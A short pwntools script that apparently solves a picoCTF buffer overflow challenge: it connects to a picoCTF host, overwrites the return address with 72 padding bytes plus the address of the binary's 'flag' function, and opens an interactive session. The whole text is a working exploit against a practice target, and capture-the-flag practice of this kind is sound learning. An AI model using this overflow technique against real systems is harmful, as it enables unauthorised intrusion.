from pwn import *

p = remote("saturn.picoctf.net", 51234)
exe = ELF("./vuln")
payload = b"a" * 72 + p64(exe.sym['flag'] + 5)

p.sendline(payload)
p.interactive() 
